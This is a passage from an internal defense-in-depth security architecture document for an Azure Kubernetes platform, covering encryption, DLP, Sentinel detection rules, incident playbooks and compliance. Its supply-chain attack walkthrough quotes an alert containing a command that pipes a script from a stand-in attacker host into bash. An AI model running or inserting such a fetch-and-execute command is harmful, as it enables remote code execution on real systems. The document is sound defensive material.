  - name: app
    volumeMounts:
    - name: secrets-store
      mountPath: "/mnt/secrets"
      readOnly: true
    
    env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: password

---
# SecretProviderClass links to Key Vault
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: azure-sync
spec:
  provider: azure
  parameters:
    usePodIdentity: "false"
    useVMManagedIdentity: "true"
    userAssignedIdentityID: "<managed-identity-id>"
    keyvaultName: "kv-idp-prod"
    objects: |
      array:
        - |
          objectName: db-password
          objectType: secret
          objectVersion: ""
    tenantId: "<tenant-id>"
```

#### 5.4 Data Classification

**Handling Based on Sensitivity:**

```yaml
Data Classification:

Highly Sensitive:
  - Examples: Passwords, private keys, customer PII
  - Storage: Azure Key Vault only
  - Access: Minimum necessary, MFA required
  - Logging: All access logged and alerted
  - Encryption: Always, customer-managed keys
  - Retention: Minimum necessary
  - Disposal: Secure deletion, purge protection

Confidential:
  - Examples: Source code, customer data, IP
  - Storage: Encrypted Azure Storage
  - Access: RBAC, need-to-know basis
  - Logging: Access logged
  - Encryption: Always, platform-managed keys
  - Retention: Per compliance requirements
  - Disposal: Soft delete (90 days)

Internal:
  - Examples: Logs, metrics, configurations
  - Storage: Encrypted
  - Access: Role-based
  - Logging: Standard
  - Encryption: Platform-managed
  - Retention: 90 days minimum
  - Disposal: Standard deletion

Public:
  - Examples: Documentation, public APIs
  - Storage: Standard
  - Access: Public (with rate limiting)
  - Logging: Basic
  - Encryption: In transit only
  - Retention: Indefinite
  - Disposal: Not applicable
```

#### 5.5 Backup Encryption

**Protected Backups:**

```yaml
Backup Strategy:

Azure Backup:
  - Frequency: Daily
  - Retention: 30 days
  - Encryption: AES-256
  - Key Management: Azure-managed
  - Immutability: Enabled (WORM)
  - Geo-redundancy: Enabled (GRS)

Kubernetes Backup (Velero):
  - Frequency: Daily
  - Scope: Cluster config, persistent volumes
  - Encryption: Enabled
  - Storage: Azure Blob (encrypted)
  - Retention: 30 days

Database Backups:
  - Automated: Azure SQL automated backups
  - Point-in-time: 7-35 days
  - Long-term: Monthly (12 months)
  - Encryption: Automatic (TDE)
  - Geo-replication: Enabled

Backup Testing:
  - Frequency: Monthly
  - Test: Full restore to isolated environment
  - Validation: Data integrity check
  - Documentation: Restore procedures updated
```

#### 5.6 Data Loss Prevention (DLP)

**Prevent Data Exfiltration:**

```yaml
DLP Controls:

Network-based:
  - Egress filtering: Azure Firewall
  - DNS filtering: Block file sharing sites
  - SSL inspection: Decrypt and inspect HTTPS

Endpoint-based:
  - Device compliance: Intune policies
  - Copy/paste restrictions: Conditional access
  - USB blocking: Device control policies

Application-based:
  - Download restrictions: Web apps
  - Email controls: Microsoft 365 DLP
  - API rate limiting: Prevent bulk export

Monitoring:
  - Anomaly detection: Unusual data access
  - Large transfers: Alert on >1GB egress
  - After-hours access: Alert and review
```

### Security Controls

|Control                  |Implementation        |Threats Mitigated                |
|-------------------------|----------------------|---------------------------------|
|**Encryption at Rest**   |AES-256, all data     |Data theft from storage          |
|**Encryption in Transit**|TLS 1.3 everywhere    |Man-in-the-middle, eavesdropping |
|**Key Vault**            |Centralized, private  |Secret exposure, credential theft|
|**Data Classification**  |Automated tagging     |Inappropriate access, oversharing|
|**Backup Encryption**    |Immutable, encrypted  |Ransomware, backup theft         |
|**DLP**                  |Multi-layer prevention|Data exfiltration                |

### Attack Scenario: Data Exfiltration

**Attack:** Insider attempts to exfiltrate customer data

**Defense Layers:**

1. **Layer 5 (Data)**:
- ✅ Data classified and access restricted (RBAC)
- ✅ DLP detects large download
- ✅ Egress firewall blocks unknown destination
- ✅ Encryption prevents reading stolen data
- ✅ Monitoring alerts on unusual access pattern

**Result:** Exfiltration blocked, insider detected.

-----

## 📡 Layer 6: Monitoring & Response

### Purpose

Detect, alert on, and respond to security incidents in real-time.

### Core Principle

> “You can’t protect what you can’t see”

### Components

#### 6.1 Azure Sentinel (SIEM)

**Security Information and Event Management:**

```yaml
Data Sources:
  - Azure Activity Logs
  - Azure AD Sign-in Logs
  - Azure AD Audit Logs
  - AKS Diagnostic Logs
  - Key Vault Audit Logs
  - Network Security Group Flows
  - Azure Firewall Logs
  - Container Insights
  - Microsoft Defender for Cloud Alerts

Analytics Rules:
  
  Brute Force Detection:
    Query: |
      SigninLogs
      | where ResultType != 0
      | summarize FailedAttempts=count() by UserPrincipalName, bin(TimeGenerated, 1h)
      | where FailedAttempts > 10
    Severity: High
    Action: Block IP, alert security team

  Privilege Escalation:
    Query: |
      AzureActivity
      | where OperationName has "roleAssignments"
      | where ActivityStatus == "Succeeded"
    Severity: Critical
    Action: Alert CISO, create incident

  Suspicious Kubernetes Activity:
    Query: |
      KubePodInventory
      | where Namespace == "kube-system"
      | where PodStatus != "Running"
    Severity: Medium
    Action: Investigate, alert platform team

  Data Exfiltration:
    Query: |
      AzureNetworkAnalytics
      | where FlowDirection == "O"  # Outbound
      | summarize TotalBytes=sum(BytesSent) by SourceIP, bin(TimeGenerated, 1h)
      | where TotalBytes > 1073741824  # 1GB
    Severity: High
    Action: Block connection, investigate
```

#### 6.2 Microsoft Defender for Cloud

**Cloud Security Posture Management:**

```yaml
Defender Plans Enabled:
  - Servers: Enhanced security (MDE integration)
  - Containers: Image scanning, runtime protection
  - Key Vault: Threat detection
  - DNS: Anomaly detection
  - Resource Manager: Control plane monitoring

Security Recommendations:
  - High Priority: Fix within 7 days
  - Medium Priority: Fix within 30 days
  - Low Priority: Next maintenance window

Regulatory Compliance:
  - Azure Security Benchmark: Enabled
  - CIS: Enabled
  - PCI DSS: Enabled (if applicable)
  - ISO 27001: Enabled (if applicable)

Auto-provisioning:
  - Log Analytics Agent: Enabled
  - Defender for Endpoint: Enabled
  - Vulnerability Assessment: Qualys
```

#### 6.3 Logging Strategy

**Comprehensive Audit Trail:**

```yaml
Log Collection:

Infrastructure Logs:
  - Azure Activity Logs: All operations
  - Resource Logs: All Azure resources
  - NSG Flow Logs: All network traffic
  - AKS Logs: API server, controller, scheduler

Application Logs:
  - Stdout/Stderr: All containers
  - Application Insights: Performance, exceptions
  - Custom Logs: Business events

Security Logs:
  - Azure AD: Sign-ins, audit
  - Key Vault: All operations
  - RBAC Changes: Role assignments
  - Policy Compliance: Azure Policy logs

Retention:
  - Hot Storage: 90 days (Log Analytics)
  - Warm Storage: 365 days (Azure Storage)
  - Cold Storage: 7 years (Archive tier)
  - Immutable: Enabled (WORM for compliance)

Log Sanitization:
  - Remove: Passwords, API keys, PII
  - Redact: Credit cards, SSNs
  - Hash: User identifiers (GDPR)
```

#### 6.4 Automated Incident Response

**SOAR Playbooks:**

```yaml
Incident: Brute Force Attack Detected

Playbook Steps:
  1. Alert Generation:
     - Sentinel creates incident
     - Severity: High
     - Assign: Security analyst
  
  2. Automated Triage:
     - Query: Get source IP details
     - Enrich: Threat intelligence lookup
     - Context: User affected, attempts count
  
  3. Automated Response:
     - Action: Block source IP at firewall
     - Action: Disable user account (if compromised)
     - Action: Force password reset
     - Action: Require MFA re-enrollment
  
  4. Investigation:
     - Collect: All logs from affected timeframe
     - Analyze: Lateral movement attempts
     - Document: Incident timeline
  
  5. Notification:
     - Email: Security team
     - Teams: Post to security channel
     - Ticket: Create Jira incident
  
  6. Remediation:
     - Review: Access granted during incident
     - Revoke: Any suspicious permissions
     - Scan: Affected systems for IOCs
  
  7. Lessons Learned:
     - Document: Root cause
     - Update: Detection rules if needed
     - Train: Users if social engineering

---
Incident: Privilege Escalation Detected

Playbook Steps:
  1. Immediate Actions:
     - Revoke: Elevated permissions
     - Terminate: Active sessions
     - Block: User account
  
  2. Forensics:
     - Snapshot: Affected VM
     - Collect: Memory dump
     - Preserve: Logs (immutable copy)
  
  3. Investigation:
     - Timeline: Reconstruct events
     - Scope: What was accessed?
     - Impact: Data breach? System compromise?
  
  4. Containment:
     - Isolate: Affected systems
     - Rotate: All credentials accessed
     - Reset: Affected accounts
  
  5. Eradication:
     - Remove: Malware/backdoors
     - Patch: Exploited vulnerabilities
     - Harden: Affected systems
  
  6. Recovery:
     - Restore: From clean backup
     - Verify: System integrity
     - Monitor: For re-infection
  
  7. Post-Incident:
     - Report: To management/CISO
     - Update: Security controls
     - Communicate: With affected users
```

#### 6.5 Threat Intelligence

**Stay Ahead of Threats:**

```yaml
Threat Intelligence Sources:

Microsoft:
  - Microsoft Threat Intelligence
  - Azure Sentinel Threat Intelligence
  - Defender for Cloud alerts

Community:
  - CISA Known Exploited Vulnerabilities
  - MITRE ATT&CK Framework
  - OWASP Top 10
  - CVE/NVD Databases

Commercial:
  - (Optional) Paid threat feeds
  - Industry-specific intelligence

Integration:
  - Sentinel: Threat intelligence connector
  - Firewall: Block known malicious IPs
  - Email: Block phishing domains
  - Endpoint: IOC hunting

Automation:
  - Daily: Update threat indicators
  - Continuous: Correlation with logs
  - Alerting: New threats matching environment
```

#### 6.6 Metrics and Dashboards

**Visibility for Decision Making:**

```yaml
Security Dashboards:

Executive Dashboard:
  - Security Posture Score
  - Open High/Critical Alerts
  - Compliance Status
  - Incident Trends
  - Mean Time to Detect (MTTD)
  - Mean Time to Respond (MTTR)

SOC Dashboard:
  - Active Incidents
  - Alerts by Severity
  - Top Attack Types
  - Top Targeted Assets
  - Analyst Workload

Platform Dashboard:
  - Cluster Health
  - Failed Deployments
  - Resource Utilization
  - Network Policy Violations
  - Image Scan Results

Compliance Dashboard:
  - Policy Compliance %
  - Audit Findings
  - Remediation Status
  - Risk Score
  - Upcoming Audits

Key Metrics:
  - Security Incidents: < 5 high/month
  - MTTD: < 15 minutes
  - MTTR: < 4 hours
  - Vulnerability Remediation: 90% within SLA
  - Security Training: 100% completion
```

### Security Controls

|Control                |Implementation        |Threats Mitigated                 |
|-----------------------|----------------------|----------------------------------|
|**SIEM**               |Azure Sentinel        |All threats (detection)           |
|**Security Posture**   |Defender for Cloud    |Misconfigurations, vulnerabilities|
|**Logging**            |Log Analytics, 90 days|Evidence, forensics, compliance   |
|**SOAR**               |Automated playbooks   |Rapid response, human error       |
|**Threat Intelligence**|Multiple sources      |Zero-days, emerging threats       |
|**Dashboards**         |Real-time visibility  |Blind spots, trends               |

### Attack Scenario: Multi-Stage Attack

**Attack:** Sophisticated attacker attempts multi-stage breach

**Defense Layers (All 6):**

1. **Layer 1**: MFA blocks initial login
1. **Layer 2**: Firewall detects reconnaissance scan
1. **Layer 3**: Network policies limit movement
1. **Layer 4**: Container scan finds malicious image
1. **Layer 5**: Key Vault denies secret access
1. **Layer 6**: Sentinel correlates events, triggers automated response

**Result:** Attack detected and stopped at multiple stages. Incident response initiated.

-----

## 🔄 Cross-Layer Security Principles

### 1. Zero Trust

**Applied Across All Layers:**

```
Layer 1: Never trust user → Always verify with MFA
Layer 2: Never trust network → Always segment and inspect
Layer 3: Never trust pod → Always enforce policy
Layer 4: Never trust code → Always scan
Layer 5: Never trust data location → Always encrypt
Layer 6: Never trust normal behavior → Always monitor
```

### 2. Least Privilege

**Minimum Necessary Access:**

```
Developers:
  - Identity: Standard user (no admin)
  - Network: Dev namespaces only
  - Platform: Read-only prod, write dev
  - Application: Deploy dev, view prod logs
  - Data: Read app configs, no secrets
  - Monitoring: View dashboards

Security Team:
  - Identity: Admin (PIM, time-limited)
  - Network: Full visibility
  - Platform: Full access (audited)
  - Application: Read all code
  - Data: Access all secrets (logged)
  - Monitoring: Full SIEM access
```

### 3. Defense-in-Depth Validation

**Test Failure Scenarios:**

```yaml
Penetration Testing:

Scenario 1: Layer 1 Bypass
  - Assumption: Attacker steals credentials
  - Test: Can they move laterally?
  - Expected: Blocked by Layers 2, 3

Scenario 2: Layer 2 Breach
  - Assumption: Firewall misconfigured
  - Test: Can attacker reach Key Vault?
  - Expected: Blocked by Layer 5 (private endpoint)

Scenario 3: Layer 3 Compromise
  - Assumption: Container escape successful
  - Test: Can attacker access other pods?
  - Expected: Blocked by Layer 3 (network policies)

Scenario 4: Layer 4 Vulnerability
  - Assumption: Zero-day in application
  - Test: Can attacker escalate privileges?
  - Expected: Detected by Layer 6 (monitoring)

Results:
  - All scenarios: Attack contained
  - No single point of failure
  - Defense-in-depth validated ✓
```

-----

## 🎯 Attack Scenario Walkthrough

### Real-World Attack: Supply Chain Compromise

**Scenario:** Attacker compromises a popular npm package used by the application.

#### Attack Timeline

**T+0 (Day 1): Compromise**

- Attacker gains access to npm package maintainer account
- Publishes malicious version with backdoor

**T+1 hour: Detection Attempt #1**

```
Layer 4 (Application Security):
  ✅ Renovate creates PR to update package
  ✅ OWASP Dependency Check scans package
  ❌ Vulnerability not yet in CVE database
  ❌ Passes initial scan
```

**T+2 hours: Code Review**

```
Layer 4 (Application Security):
  ✅ Security team reviews Dependabot PR
  ⚠️ Unusual code in package noticed
  🔍 Escalated for investigation
  ❌ PR blocked pending review
```

**T+6 hours: Assume Bypass (Red Team)**

```
Assumption: Malicious package deployed to dev

Layer 4 (Application Security):
  ❌ Malicious code in container image

Layer 3 (Platform Security):
  ✅ Container starts in dev namespace
  ✅ Pod Security Standard enforced
  ❌ Backdoor attempts to open reverse shell
  ✅ BLOCKED: Non-root user, no capabilities
```

**T+6 hours + 5 min: Runtime Detection**

```
Layer 6 (Monitoring):
  ✅ Falco detects shell spawn in container
  
  Alert: Shell spawned in container
    Severity: CRITICAL
    Container: app-dev-xxxx
    Namespace: development
    Command: /bin/bash -c 'curl attacker.com/shell.sh | bash'
    
  ✅ Automated Response Triggered:
    1. Terminate pod
    2. Block egress to attacker.com
    3. Create incident in Sentinel
    4. Alert security team
```

**T+6 hours + 10 min: Network Containment**

```
Layer 2 (Network):
  ✅ Egress firewall blocks curl to attacker.com
  ✅ Network policy prevents pod-to-pod communication
  
  Even if shell worked:
    - Cannot reach other pods (Layer 3)
    - Cannot exfiltrate data (Layer 2)
    - Cannot access Key Vault (Layer 5 - private endpoint)
```

**T+6 hours + 30 min: Incident Response**

```
Layer 6 (Monitoring & Response):
  
  Automated Actions:
    ✅ Quarantine namespace
    ✅ Block package version in policy
    ✅ Scan all images for malicious package
    ✅ Create forensic snapshot
  
  Human Actions:
    ✅ Security team investigates
    ✅ Identify malicious package
    ✅ Remove from all environments
    ✅ Update dependency scanner rules
    ✅ Notify community (responsible disclosure)
```

#### Defense Summary

```
Layer 1 (Identity):        N/A for this attack
Layer 2 (Network):         ✅ Blocked C2 communication
Layer 3 (Platform):        ✅ Prevented shell execution
Layer 4 (Application):     ⚠️ Initial detection, code review blocked
Layer 5 (Data):            ✅ Secrets inaccessible (even if shell worked)
Layer 6 (Monitoring):      ✅ Detected, alerted, auto-responded

Result: ATTACK CONTAINED
Impact: Development environment only
Data Loss: None
Secrets Compromised: None
Lessons Learned: Enhanced dependency review process
```

-----

## 📊 Security Control Matrix

### Control Effectiveness by Layer

|Threat                  |L1|L2|L3|L4|L5|L6|Overall    |
|------------------------|--|--|--|--|--|--|-----------|
|**Credential Theft**    |✅ |⚠️ |➖ |➖ |➖ |✅ |Strong     |
|**Network Attack**      |➖ |✅ |⚠️ |➖ |➖ |✅ |Strong     |
|**Container Escape**    |➖ |⚠️ |✅ |➖ |➖ |✅ |Strong     |
|**Code Injection**      |➖ |⚠️ |⚠️ |✅ |➖ |✅ |Strong     |
|**Data Exfiltration**   |⚠️ |✅ |⚠️ |➖ |✅ |✅ |Very Strong|
|**Supply Chain**        |➖ |➖ |⚠️ |✅ |➖ |✅ |Moderate   |
|**Privilege Escalation**|✅ |➖ |✅ |➖ |➖ |✅ |Strong     |
|**DDoS**                |➖ |✅ |⚠️ |➖ |➖ |✅ |Strong     |
|**Insider Threat**      |⚠️ |⚠️ |⚠️ |⚠️ |✅ |✅ |Moderate   |
|**Zero-Day**            |➖ |⚠️ |⚠️ |➖ |➖ |✅ |Moderate   |

**Legend:**

- ✅ Primary defense
- ⚠️ Secondary defense
- ➖ Not applicable / Minimal

-----

## ✅ Implementation Checklist

### Layer 1: Identity & Access Management

- [ ] Azure AD configured with organizational account
- [ ] MFA enforced for all users
- [ ] Conditional Access policies defined
- [ ] PIM configured for privileged roles
- [ ] Managed identities used for all service-to-service auth
- [ ] RBAC roles defined and assigned
- [ ] Emergency access accounts configured (break-glass)
- [ ] Identity governance policies established

### Layer 2: Network Security

- [ ] Virtual Network created with proper CIDR
- [ ] Subnets created and segmented
- [ ] Network Security Groups configured (default deny)
- [ ] Azure Firewall deployed and configured
- [ ] Firewall rules documented and tested
- [ ] Private endpoints configured for all PaaS services
- [ ] Private DNS zones configured
- [ ] DDoS Protection Standard enabled
- [ ] WAF configured with OWASP rules

### Layer 3: Platform Security

- [ ] AKS cluster deployed as private
- [ ] Azure AD integration configured
- [ ] Kubernetes RBAC roles defined
- [ ] Network policies implemented (Calico)
- [ ] Pod Security Standards enforced
- [ ] Managed identity configured for kubelet
- [ ] Container runtime security enabled (Falco)
- [ ] Image signing implemented (Cosign)
- [ ] Admission controllers configured (OPA/Gatekeeper)

### Layer 4: Application Security

- [ ] SAST tools integrated (CodeQL, Semgrep, SonarQube)
- [ ] DAST tools configured (OWASP ZAP)
- [ ] Dependency scanning enabled (OWASP DC, Snyk)
- [ ] Secret scanning configured (detect-secrets, TruffleHog)
- [ ] Container scanning in pipeline (Trivy, Snyk)
- [ ] Code review process established
- [ ] Security gates in CI/CD pipeline
- [ ] SBOM generation automated

### Layer 5: Data Security

- [ ] Encryption at rest enabled for all storage
- [ ] TLS 1.3 enforced for all connections
- [ ] Azure Key Vault deployed
- [ ] Key Vault configured with private endpoint
- [ ] Secrets stored in Key Vault (none in code)
- [ ] Data classification implemented
- [ ] Backup encryption verified
- [ ] DLP policies configured

### Layer 6: Monitoring & Response

- [ ] Azure Sentinel workspace created
- [ ] Data connectors configured
- [ ] Analytics rules created
- [ ] Automated playbooks deployed
- [ ] Microsoft Defender for Cloud enabled
- [ ] Log Analytics workspace configured
- [ ] Diagnostic settings enabled on all resources
- [ ] Security dashboards created
- [ ] Alert recipients configured
- [ ] Incident response plan documented

-----

## 📜 Compliance Mapping

### ISO 27001

|Control                     |Layer  |Implementation                  |
|----------------------------|-------|--------------------------------|
|A.9 Access Control          |Layer 1|Azure AD + MFA + RBAC           |
|A.10 Cryptography           |Layer 5|AES-256, TLS 1.3, Key Vault     |
|A.12 Operations Security    |Layer 6|Monitoring, patching, backups   |
|A.13 Communications Security|Layer 2|Network segmentation, encryption|
|A.14 System Acquisition     |Layer 4|SDLC, security testing          |

### CIS Benchmarks

|Benchmark            |Layer  |Status       |
|---------------------|-------|-------------|
|CIS Azure Foundations|All    |✅ Implemented|
|CIS Kubernetes       |Layer 3|✅ Implemented|
|CIS Docker           |Layer 4|✅ Implemented|

### NIST Cybersecurity Framework

|Function|Layers|Implementation                                |
|--------|------|----------------------------------------------|
|Identify|All   |Asset inventory, risk assessment, threat model|
|Protect |1-5   |Access controls, encryption, secure config    |
|Detect  |6     |Continuous monitoring, anomaly detection      |
|Respond |6     |Incident response, automated playbooks        |
|Recover |5, 6  |Backups, disaster recovery, lessons learned   |

-----

## 📚 References

### Microsoft Documentation

- [Azure Security Benchmark](https://docs.microsoft.com/en-us/security/benchmark/azure/)
- [Azure Well-Architected Framework - Security](https://docs.microsoft.com/en-us/azure/architecture/framework/security/)
- [AKS Security Best Practices](https://docs.microsoft.com/en-us/azure/aks/security-hardened-vm-host-image)

### Industry Standards

- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [ISO/IEC 27001:2013](https://www.iso.org/isoiec-27001-information-security.html)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Kubernetes Security

- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2021/Aug/03/2002820425/-1/-1/1/CTR_KUBERNETES%20HARDENING%20GUIDANCE.PDF)

### Container Security

- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [NIST Application Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)

-----

## 📝 Document Control

**Version History:**

|Version|Date      |Author       |Changes                              |
|-------|----------|-------------|-------------------------------------|
|1.0    |2024-12-21|Security Team|Initial defense-in-depth architecture|

**Review Schedule:**

- **Quarterly**: Technical review
- **Annually**: Comprehensive audit
- **Ad-hoc**: After major incidents or architecture changes

**Next Review:** March 21, 2025

**Approvals:**

- [ ] CISO
- [ ] Platform Engineering Lead
- [ ] Security Architect

-----

**Document Classification:** Internal  
**Distribution:** Security team, Engineering, Management  
**Retention:** 5 years

-----

*Defense-in-depth is not a destination, it’s a journey. This document will evolve as threats emerge, technology advances, and our platform matures.*

**Remember:** Security is everyone’s responsibility. Each layer depends on the others. Stay vigilant. 🛡️
